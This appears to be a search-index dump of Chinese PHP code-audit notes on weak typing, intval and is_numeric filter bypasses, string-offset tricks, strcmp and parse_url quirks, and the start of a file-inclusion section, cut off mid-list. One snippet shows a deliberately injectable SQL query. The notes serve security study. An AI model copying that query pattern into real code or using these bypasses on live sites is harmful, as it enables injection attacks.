\u5f53\u4e00\u4e2a\u6574\u5f62\u548c\u4e00\u4e2a\u5176\u4ed6\u7c7b\u578b\u884c\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u5176\u4ed6\u7c7b\u578b intval \u518d\u6bd4\u8f83 bool\u7c7b\u578b\u7684 true \u8ddf\u4efb\u610f\u5b57\u7b26\u4e32\u53ef\u4ee5\u5f31\u7c7b\u578b\u76f8\u7b49 1 2 3 4 5 6 7 8 9 10 11 1 == '1abc' // true true == 'abcd' // true \"42\" == \"42.0\" // true \"42\" == \"000042.00\" // true \"42\" == \"0x000000002A\" // true \"10\" == \"1e1\" // true \"42\" == \"0000000004.2E+1\" // true \"42\" == \"42.0e+000000\" // true [false] == [0] == [NULL] == [''] NULL == false == 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 '0.999999999999999999999' == 1 # true in PHP 4.3.0+ '0e0' == '0e1' '0e0' == '0E1' '10e2' == ' 01e3' '10e2' == '01e3' '10e2' == '1e3' '010e2' == '1e3' '010e2' == '01e3' '10' == '010' '10.0' == '10' '10' == '00000000010' '12345678' == '00000000012345678' '0010e2' == '1e3' '123000' == '123e3' '123000e2' == '123e5' # true in 5.2.1+ # false in PHP 4.3.0 - 5.2.0 '608E-4234' == '272E-3063' # true in PHP 4.3.0 - 5.6.x # false in 7.0.0+ '0e0' == '0x0' '0xABC' == '0xabc' '0xABCdef' == '0xabcDEF' '000000e1' == '0x000000' '0xABFe1' == '0xABFE1' '0xe' == '0Xe' '0xABCDEF' == '11259375' '0xABCDEF123' == '46118400291' '0x1234AB' == '1193131' '0x1234Ab' == '1193131' # true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+ '0xABCdef' == ' 0xabcDEF' '1e1' == '0xa' '0xe' == ' 0Xe' '0x123' == ' 0x123' # true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0 # false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+ '0e0' == '0x0a' # true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2 # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+ '0xe' == ' 0Xe.' intval \u00b6 intval() \u5728\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 var_dump(0 == '0'); // true var_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // false var_dump(1 == '1abcdef'); // true if(intval($a) > 1000) { mysql_query(\"select * from news where id=\".$a) } trim \u00b6 trim \u51fd\u6570\u4f1a\u8fc7\u6ee4\u7a7a\u683c\u4ee5\u53ca \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f 1 2 $a = \" \\n\\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); // abc \\f \u5229\u7528 trim \u53ca is_numeric \u7b49\u51fd\u6570\u5b9e\u73b0\u7684\u7ed5\u8fc7: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php // %0c1%00 $number = \"\\f1 \\0 \" ; // trim \u51fd\u6570\u4f1a\u8fc7\u6ee4 \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f $number_2 = trim ( $number ); var_dump ( $number_2 ); // \\f1 $number_2 = addslashes ( $number_2 ); var_dump ( $number_2 ); // \\f1 // is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u8fc7\u6ee4\u6389 '', '\\t', '\\n', '\\r', '\\v', '\\f' \u7b49\u5b57\u7b26 // \u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 '\\0' var_dump ( is_numeric ( $number )); // false var_dump ( strval ( intval ( $number_2 ))); // 1 var_dump ( \"\\f1\" == \"1\" ); // true ?> \u5c1d\u8bd5\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 php > $number = \"\\f1\\0\"; php > $number_2 = trim($number); php > var_dump($number_2); string(2) \" 1\" // \\f\u5b57\u7b26\u6b64\u5904\u4e0d\u53ef\u6253\u5370 php > $number_2 = addslashes($number_2); php > var_dump($number_2); string(2) \" 1\" php > var_dump(is_numeric($number)); bool(false) php > var_dump(is_numeric($number_2)); bool(true) php > var_dump(\"\\f1\" == \"1\"); bool(true) is_numeric \u00b6 PHP\u63d0\u4f9b\u4e86is_numeric\u51fd\u6570\uff0c\u7528\u6765\u53d8\u91cf\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u3002\u4f46\u662f\u51fd\u6570\u7684\u8303\u56f4\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u4e0d\u4ec5\u4ec5\u662f\u5341\u8fdb\u5236\u7684\u6570\u5b57\u3002 1 2 3 4 5 6 7 8 <?php echo is_numeric ( 233333 ); // 1 echo is_numeric ( '233333' ); // 1 echo is_numeric ( 0x233333 ); // 1 echo is_numeric ( '0x233333' ); // 1 echo is_numeric ( '9e9' ); // 1 echo is_numeric ( '233333abc' ); // 0 ?> is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u6389\u524d\u9762\u7684 \u2018 \u2018, \u2018\\t\u2019, \u2018\\n\u2019, \u2018\\r\u2019, \u2018\\v\u2019, \u2018\\f\u2019 \u7b49\u5b57\u7b26\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 \u2018\\0\u2019\uff0c\u5982\u679c\u8fd9\u4e9b\u5b57\u7b26\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u5c3e\uff0c\u4e5f\u4e0d\u4f1a\u8fc7\u6ee4\uff0c\u800c\u662f\u8fd4\u56de false 1 2 3 4 5 6 7 8 9 10 11 var_dump(is_numeric(\"\\01\")); // false var_dump(is_numeric(\" 1\")); // true var_dump(is_numeric(\"\\t1\")); // true var_dump(is_numeric(\"\\n1\")); // true var_dump(is_numeric(\"\\r1\")); // true var_dump(is_numeric(\"\\v1\")); // true var_dump(is_numeric(\"\\f1\")); // true var_dump(is_numeric(\"\\f\\f1\")); // true var_dump(is_numeric(\"1\\f\")); // false \u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32 \u00b6 \u5f53 $var \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8bbf\u95ee $var[\"any string\"] \u8ddf\u8bbf\u95ee $var[intval(\"any string\")] \u6548\u679c\u662f\u4e00\u6837\u7684\u3002\u5982\u679c\u6709\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7ed5\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 php > $userinfo = 'abcdefg'; php > $userinfo['id'] = 123; PHP Warning: Illegal string offset 'id' in php shell code on line 1 php > print_r($userinfo); 1bcdefg php > print_r($userinfo['id']); PHP Warning: Illegal string offset 'id' in php shell code on line 1 1 php > $userinfo['role'] = 1; PHP Warning: Illegal string offset 'role' in php shell code on line 1 php > print_r($userinfo['role']); PHP Warning: Illegal string offset 'role' in php shell code on line 1 1 php > print_r($userinfo); 1bcdefg php > var_dump($userinfo); string(7) \"1bcdefg\" \u53c2\u8003 \u00b6 \u5ba1\u8ba1","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc63"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#3","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc63"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_1","text":"1 2 3 4 5 6 7 8 9 $GLOBALS // \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf $_POST // \u83b7\u53d6 post \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_GET // \u83b7\u53d6 get \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_COOKIE // \u83b7\u53d6 cookie $_SESSION // \u83b7\u53d6 session $_FILES // \u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6 $_REQUEST // \u83b7\u53d6 $_GET\uff0c$_POST\uff0c$_COOKIE \u4e2d\u7684\u6570\u636e $_ENV // \u73af\u5883\u53d8\u91cf $_SERVER // \u670d\u52a1\u5668\u548c\u6267\u884c\u73af\u5883\u4fe1\u606f","title":"\u7cfb\u7edf\u53d8\u91cf\uff08\u8d85\u5168\u5c40\u53d8\u91cf\uff09"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_2","text":"1 2 3 4 5 6 7 $a=\"hello\"; // \u5b9a\u4e49\u53ef\u53d8\u53d8\u91cf\u65f6\uff0c\u53ef\u4ee5\u52a0\u4e0a\u5927\u62ec\u53f7 ${$a}=\"world\"; echo ${$a}; echo $$a; // \u5c06\u666e\u901a\u53d8\u91cf\u7684\u503c hello\uff0c\u4f5c\u4e3a\u53ef\u53d8\u53d8\u91cf\u7684\u53d8\u91cf\u540d\uff0c\u5373 $a echo $hello;","title":"$\u5bfc\u81f4\u7684\u53d8\u91cf\u8986\u76d6"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_3","text":"1 2 3 $str='hello'; echo \"str is $str\"; // \u8fd0\u884c\u7ed3\u679c : str is hello echo 'str is $str'; // \u8fd0\u884c\u7ed3\u679c : str is $str","title":"\u53cc\u5f15\u53f7\u89e3\u6790\u53d8\u91cf\uff0c\u5355\u5f15\u53f7\u4e0d\u89e3\u6790\u53d8\u91cf"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_4","text":"1 2 3 4 5 6 7 8 9 php > var_dump($a); PHP Notice: Undefined variable: a in php shell code on line 1 NULL php > var_dump($a==0); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump($a+1); PHP Notice: Undefined variable: a in php shell code on line 1 int(1) //\u4e8e\u662f\u53ef\u4ee5\u901a\u8fc7\u672a\u5b9a\u4e49\u53d8\u91cf\u6765\u83b7\u5f97\u6570\u503c","title":"\u672a\u5b9a\u4e49\u53d8\u91cf"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_5","text":"glob \u51fd\u6570 scandir \u51fd\u6570","title":"\u6587\u4ef6\u64cd\u4f5c\u76f8\u5173"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_get_post","text":"\u5982\u679c GET \u53c2\u6570\u4e2d\u8bbe\u7f6e name[]=a \uff0c\u90a3\u4e48 $_GET['name'] = [a] \uff0cphp \u4f1a\u628a []=a \u5f53\u6210\u6570\u7ec4\u4f20\u5165\uff0c $_GET \u4f1a\u81ea\u52a8\u5bf9\u53c2\u6570\u8c03\u7528 urldecode \u3002 $_POST \u540c\u6837\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u6570\u636e\uff0c user[]=admin \uff0c $_POST['user'] \u5f97\u5230\u7684\u662f ['admin'] \u662f\u4e00\u4e2a\u6570\u7ec4\u3002","title":"$_GET\u548c$_POST\u4f20\u5165\u6570\u7ec4"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#strcmp-strcasecmp","text":"strcmp \u548c strcasecmp\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 \u7528\u4e8e\u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u503c\u5982\u4e0b\uff1a \u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b \u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 5.2 \u4e2d\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u5148\u8f6c\u6362\u6210string\u7c7b\u578b\u3002 5.3.3 \u4ee5\u540e\uff0c\u5f53\u6bd4\u8f83\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u662f0\u3002 5.5 \u4e2d\u5982\u679c\u53c2\u6570\u4e0d\u662fstring\u7c7b\u578b\uff0c\u76f4\u63a5return\u4e86","title":"strcmp \u548c strcasecmp"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#null","text":"1 2 3 4 5 6 7 php > $array=[1, 2, 3]; php > var_dump(strcmp($array, 'abc')); PHP Warning: strcmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL //\u67d0\u79cd\u7a0b\u5ea6\u5c31\u662f0 php > var_dump(strcasecmp($array, 'abc')); PHP Warning: strcasecmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL","title":"\u6570\u7ec4\u8ddf\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f1a\u8fd4\u56de NULL"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#parse_url","text":"parse_url() \u51fd\u6570\u53ef\u4ee5\u89e3\u6790 URL\uff0c\u8fd4\u56de\u5176\u7ec4\u6210\u90e8\u5206\uff0c\u6b64\u51fd\u6570\u5e76\u4e0d\u610f\u5473\u7740\u7ed9\u5b9a\u7684 URL \u662f\u5408\u6cd5\u7684\uff0c\u5b83\u53ea\u662f\u5c06\u4e0a\u65b9\u5217\u8868\u4e2d\u7684\u5404\u90e8\u5206\u5206\u5f00\u3002parse_url() \u53ef\u63a5\u53d7\u4e0d\u5b8c\u6574\u7684 URL\uff0c\u5e76\u5c3d\u91cf\u5c06\u5176\u89e3\u6790\u6b63\u786e\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff1a 1 2 3 4 5 6 7 8 php > $url = 'http://prontosil.club'; php > var_dump(parse_url($url)); array(2) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(14) \"prontosil.club\" } \u4f46\u662f\u5f53\u4e00\u4e2aurl\u6ca1\u6709\u534f\u8bae\u7684\u65f6\u5019\uff0c\u4f46\u662f\u7ed9\u4e00\u4e2a\u7aef\u53e3url\u7684\u5b57\u7b26\u4e32\u7684\u65f6\u5019parse_url\u5c31\u4f1a\u7206\u9519\u3002\u8fd9\u4e2a\u7ecf\u6d4b\u8bd5\u5728windows\u4e0b\u5e94\u8be5\u662fphp\u7248\u672c\u5168\u901a\u6740\u7684(5.2-7.0)\uff0clinux\u6ca1\u6d4b\u8bd5\u8fc7\u3002 1 2 3 php > $url = '/pupiles.com:80'; php > var_dump(parse_url($url)); bool(false) \u53ea\u8981\u7aef\u53e3\u540e\u9762\u8ddf\u5b57\u6bcd\u8fd8\u662f\u4f1a\u89e3\u6790\uff0c\u6bd4\u5982 1 2 3 4 5 6 php > $url = '/pupiles.com:80a'; php > var_dump(parse_url($url)); array(1) { [\"path\"]=> string(16) \"/pupiles.com:80a\" }","title":"parse_url"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_6","text":"1 2 3 4 5 6 7 8 9 // php5.5\u4ee5\u4e0a\u8fd9\u6837\u7684url\u7528parse_url\u89e3\u6790\u540e\u9884\u6d4b\u7684\u7ed3\u679c\u662f //pupiles.com/about:1234 array(2) { [\"host\"]=> string(11) \"pupiles.com\" [\"path\"]=> string(9) \"/about:1234\" } \u7136\u800c\u5b9e\u9645\u4e0a\uff1a 1 2 3 4 5 6 7 8 9 10 php > $url = 'pupiles.com/about:1234'; php > var_dump(parse_url($url)); array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } \u4f1a\u9ed8\u8ba4\u89e3\u6790\u51fa\u4e00\u4e2aportkey","title":"\u7aef\u53e3\u89e3\u6790\u9519\u8bef"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_7","text":"1 2 3 4 5 6 7 8 php > print_r($uri); /upload?/home/binarycloud/ php > print_r(parse_url($uri)); Array ( [path] => /upload [query] => /home/binarycloud/ ) 1 2 3 4 5 6 7 php > $uri = \"//upload?/home/binarycloud/\"; php > print_r(parse_url($uri)); Array ( [host] => upload [query] => /home/binarycloud/ )","title":"\u8def\u5f84\u89e3\u6790\u9519\u8bef"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_8","text":"\u5728php5.3.13\u7248\u672c\u4ee5\u4e0b\uff0c\u5f53\u8f93\u5165\u5982\u4e0burl 1 http://pupiles:78325 \u6309\u7167\u6b63\u5e38\u6765\u8bf4\u5e94\u8be5\u4f1a\u8fd4\u56defalse\uff0c\u4f46\u662f\u8fd9\u91cc\u4f1a\u8fd4\u56de 1 2 3 4 5 array(3) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(7) \"pupiles\" [\"port\"]=> int(12789) } php=5.5.38\u5982\u4e0b\uff1a 1 2 3 php > $uri = 'http://pupiles:78325'; php > var_dump(parse_url($uri)); bool(false)","title":"\u7aef\u53e3\u6ea2\u51fa"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_9","text":"\u5f53\u4e00\u4e2a\u6574\u5f62\u548c\u4e00\u4e2a\u5176\u4ed6\u7c7b\u578b\u884c\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u5176\u4ed6\u7c7b\u578b intval \u518d\u6bd4\u8f83 bool\u7c7b\u578b\u7684 true \u8ddf\u4efb\u610f\u5b57\u7b26\u4e32\u53ef\u4ee5\u5f31\u7c7b\u578b\u76f8\u7b49 1 2 3 4 5 6 7 8 9 10 11 1 == '1abc' // true true == 'abcd' // true \"42\" == \"42.0\" // true \"42\" == \"000042.00\" // true \"42\" == \"0x000000002A\" // true \"10\" == \"1e1\" // true \"42\" == \"0000000004.2E+1\" // true \"42\" == \"42.0e+000000\" // true [false] == [0] == [NULL] == [''] NULL == false == 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 '0.999999999999999999999' == 1 # true in PHP 4.3.0+ '0e0' == '0e1' '0e0' == '0E1' '10e2' == ' 01e3' '10e2' == '01e3' '10e2' == '1e3' '010e2' == '1e3' '010e2' == '01e3' '10' == '010' '10.0' == '10' '10' == '00000000010' '12345678' == '00000000012345678' '0010e2' == '1e3' '123000' == '123e3' '123000e2' == '123e5' # true in 5.2.1+ # false in PHP 4.3.0 - 5.2.0 '608E-4234' == '272E-3063' # true in PHP 4.3.0 - 5.6.x # false in 7.0.0+ '0e0' == '0x0' '0xABC' == '0xabc' '0xABCdef' == '0xabcDEF' '000000e1' == '0x000000' '0xABFe1' == '0xABFE1' '0xe' == '0Xe' '0xABCDEF' == '11259375' '0xABCDEF123' == '46118400291' '0x1234AB' == '1193131' '0x1234Ab' == '1193131' # true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+ '0xABCdef' == ' 0xabcDEF' '1e1' == '0xa' '0xe' == ' 0Xe' '0x123' == ' 0x123' # true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0 # false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+ '0e0' == '0x0a' # true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2 # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+ '0xe' == ' 0Xe.'","title":"\u5f31\u7c7b\u578b"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#intval","text":"intval() \u5728\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 var_dump(0 == '0'); // true var_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // false var_dump(1 == '1abcdef'); // true if(intval($a) > 1000) { mysql_query(\"select * from news where id=\".$a) }","title":"intval"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#trim","text":"trim \u51fd\u6570\u4f1a\u8fc7\u6ee4\u7a7a\u683c\u4ee5\u53ca \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f 1 2 $a = \" \\n\\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); // abc \\f \u5229\u7528 trim \u53ca is_numeric \u7b49\u51fd\u6570\u5b9e\u73b0\u7684\u7ed5\u8fc7: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php // %0c1%00 $number = \"\\f1 \\0 \" ; // trim \u51fd\u6570\u4f1a\u8fc7\u6ee4 \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f $number_2 = trim ( $number ); var_dump ( $number_2 ); // \\f1 $number_2 = addslashes ( $number_2 ); var_dump ( $number_2 ); // \\f1 // is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u8fc7\u6ee4\u6389 '', '\\t', '\\n', '\\r', '\\v', '\\f' \u7b49\u5b57\u7b26 // \u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 '\\0' var_dump ( is_numeric ( $number )); // false var_dump ( strval ( intval ( $number_2 ))); // 1 var_dump ( \"\\f1\" == \"1\" ); // true ?> \u5c1d\u8bd5\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 php > $number = \"\\f1\\0\"; php > $number_2 = trim($number); php > var_dump($number_2); string(2) \" 1\" // \\f\u5b57\u7b26\u6b64\u5904\u4e0d\u53ef\u6253\u5370 php > $number_2 = addslashes($number_2); php > var_dump($number_2); string(2) \" 1\" php > var_dump(is_numeric($number)); bool(false) php > var_dump(is_numeric($number_2)); bool(true) php > var_dump(\"\\f1\" == \"1\"); bool(true)","title":"trim"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#is_numeric","text":"PHP\u63d0\u4f9b\u4e86is_numeric\u51fd\u6570\uff0c\u7528\u6765\u53d8\u91cf\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u3002\u4f46\u662f\u51fd\u6570\u7684\u8303\u56f4\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u4e0d\u4ec5\u4ec5\u662f\u5341\u8fdb\u5236\u7684\u6570\u5b57\u3002 1 2 3 4 5 6 7 8 <?php echo is_numeric ( 233333 ); // 1 echo is_numeric ( '233333' ); // 1 echo is_numeric ( 0x233333 ); // 1 echo is_numeric ( '0x233333' ); // 1 echo is_numeric ( '9e9' ); // 1 echo is_numeric ( '233333abc' ); // 0 ?> is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u6389\u524d\u9762\u7684 \u2018 \u2018, \u2018\\t\u2019, \u2018\\n\u2019, \u2018\\r\u2019, \u2018\\v\u2019, \u2018\\f\u2019 \u7b49\u5b57\u7b26\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 \u2018\\0\u2019\uff0c\u5982\u679c\u8fd9\u4e9b\u5b57\u7b26\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u5c3e\uff0c\u4e5f\u4e0d\u4f1a\u8fc7\u6ee4\uff0c\u800c\u662f\u8fd4\u56de false 1 2 3 4 5 6 7 8 9 10 11 var_dump(is_numeric(\"\\01\")); // false var_dump(is_numeric(\" 1\")); // true var_dump(is_numeric(\"\\t1\")); // true var_dump(is_numeric(\"\\n1\")); // true var_dump(is_numeric(\"\\r1\")); // true var_dump(is_numeric(\"\\v1\")); // true var_dump(is_numeric(\"\\f1\")); // true var_dump(is_numeric(\"\\f\\f1\")); // true var_dump(is_numeric(\"1\\f\")); // false","title":"is_numeric"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_10","text":"\u5f53 $var \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8bbf\u95ee $var[\"any string\"] \u8ddf\u8bbf\u95ee $var[intval(\"any string\")] \u6548\u679c\u662f\u4e00\u6837\u7684\u3002\u5982\u679c\u6709\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7ed5\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 php > $userinfo = 'abcdefg'; php > $userinfo['id'] = 123; PHP Warning: Illegal string offset 'id' in php shell code on line 1 php > print_r($userinfo); 1bcdefg php > print_r($userinfo['id']); PHP Warning: Illegal string offset 'id' in php shell code on line 1 1 php > $userinfo['role'] = 1; PHP Warning: Illegal string offset 'role' in php shell code on line 1 php > print_r($userinfo['role']); PHP Warning: Illegal string offset 'role' in php shell code on line 1 1 php > print_r($userinfo); 1bcdefg php > var_dump($userinfo); string(7) \"1bcdefg\"","title":"\u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32"},{"location":"web_sec/audit/\u5ba1\u8ba1\u5c0f\u77e5\u8bc63/#_11","text":"\u5ba1\u8ba1","title":"\u53c2\u8003"},{"location":"web_sec/audit/\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf/","text":"\u6587\u4ef6\u5305\u542b\u5e38\u89c1\u59ff\u52bf \u00b6 \u6587\u4ef6\u5305\u542b\u51fd\u6570 \u00b6 include require include_once require_once include\u5982\u679c\u6ca1\u6709\u627e\u5230\u6587\u4ef6\u4f1a\u53d1\u51fa\u8b66\u544a\uff0c\u800crequire\u5219\u4f1a\u53d1\u51fa\u4e00\u4e2a\u81f4\u547d\u9519\u8bef \u5982\u679c\u201cURL include wrappers\u201d\u5728 PHP \u4e2d\u88ab\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u7528 URL\uff08\u901a\u8fc7 HTTP \u6216\u8005\u5176\u5b83\u652f\u6301\u7684\u5c01\u88c5\u534f\u8bae\u2014\u2014\u89c1\u652f\u6301\u7684\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae\uff09\u800c\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u6765\u6307\u5b9a\u8981\u88ab\u5305\u542b\u7684\u6587\u4ef6\u3002\u5982\u679c\u76ee\u6807\u670d\u52a1\u5668\u5c06\u76ee\u6807\u6587\u4ef6\u4f5c\u4e3a PHP \u4ee3\u7801\u89e3\u91ca\uff0c\u5219\u53ef\u4ee5\u7528\u9002\u7528\u4e8e HTTP GET \u7684 URL \u8bf7\u6c42\u5b57\u7b26\u4e32\u6765\u5411\u88ab\u5305\u62ec\u7684\u6587\u4ef6\u4f20\u9012\u53d8\u91cf\u3002\u4e25\u683c\u7684\u8bf4\u8fd9\u548c\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u5e76\u7ee7\u627f\u7236\u6587\u4ef6\u7684\u53d8\u91cf\u7a7a\u95f4\u5e76\u4e0d\u662f\u4e00\u56de\u4e8b\uff1b\u8be5\u811a\u672c\u6587\u4ef6\u5b9e\u9645\u4e0a\u5df2\u7ecf\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\uff0c\u800c\u672c\u5730\u811a\u672c\u5219\u5305\u62ec\u4e86\u5176\u7ed3\u679c\u3002 \u652f\u6301\u534f\u8bae\u548c\u5c01\u88c5\u534f\u8bae file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf http:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740 ftp:// \u2014 \u8bbf\u95ee FTP(s) URLs php:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09 zlib:// \u2014 \u538b\u7f29\u6d41 data:// \u2014 \u6570\u636e\uff08RFC 2397\uff09 glob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f phar:// \u2014 PHP \u5f52\u6863 ssh2:// \u2014 